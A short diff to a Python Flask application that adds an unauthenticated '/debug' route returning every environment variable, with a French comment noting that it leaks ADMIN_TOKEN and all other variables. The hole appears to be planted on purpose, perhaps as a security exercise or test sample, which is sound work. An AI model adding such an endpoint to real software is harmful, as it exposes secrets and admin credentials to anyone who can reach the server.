@@ -148,6 +148,10 @@ def openapi_spec():
     }
     return Response(json.dumps(spec), mimetype="application/json")
 
+@app.route("/debug")
+def debug():
+    return dict(os.environ)   # fuite de ADMIN_TOKEN et de toutes les variables
+
 init_db()
 if __name__ == "__main__":
     app.run(host=HOST, port=PORT)
